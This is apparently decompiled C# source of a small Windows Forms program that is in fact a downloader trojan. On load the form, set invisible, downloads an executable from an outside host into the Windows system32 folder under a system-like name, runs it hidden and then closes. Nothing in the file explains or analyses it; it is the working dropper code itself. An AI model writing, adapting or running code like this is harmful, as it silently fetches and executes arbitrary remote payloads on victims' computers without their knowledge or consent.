using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Proyecto1.My;

namespace Proyecto1;

[DesignerGenerated]
internal class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	public ToolTip ToolTip1;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool Disposing)
	{
		if (Disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(Disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		new ResourceManager(typeof(Form1));
		components = new Container();
		ToolTip1 = new ToolTip(components);
		((Control)this).SuspendLayout();
		ToolTip1.set_Active(true);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("Form1");
		Size clientSize = new Size(312, 206);
		((Form)this).set_ClientSize(clientSize);
		Point location = new Point(345, 294);
		((Form)this).set_Location(location);
		((Control)this).set_Visible(false);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.Control);
		((Form)this).set_FormBorderStyle((FormBorderStyle)4);
		((Form)this).set_ControlBox(true);
		((Control)this).set_Enabled(true);
		((Form)this).set_KeyPreview(false);
		((Form)this).set_MaximizeBox(true);
		((Form)this).set_MinimizeBox(true);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(true);
		((Form)this).set_HelpButton(false);
		((Form)this).set_WindowState((FormWindowState)0);
		((Control)this).set_Name("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("urlmon", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int URLDownloadToFileA(int pCaller, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szURL, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFileName, int dwReserved, int lpfnCB);

	private bool DownloadFile(ref string URL, ref string LocalFilename)
	{
		if (URLDownloadToFileA(0, ref URL, ref LocalFilename, 0, 0) == 0)
		{
			return true;
		}
		bool result = default(bool);
		return result;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string URL = "http://www.r0xlink3d.net/Ana_Clara/Link.exe";
		string LocalFilename = "C:\\WINDOWS\\system32\\algcs.exe";
		_ = (object)DownloadFile(ref URL, ref LocalFilename);
		LocalFilename = "algcs.exe";
		LoadEXE(ref LocalFilename);
		((Form)this).Close();
	}

	public void LoadEXE(ref string Dir_Renamed)
	{
		checked
		{
			_ = (short)Interaction.Shell("C:\\WINDOWS\\system32\\algcs.exe", (AppWinStyle)2, false, -1);
		}
	}
}
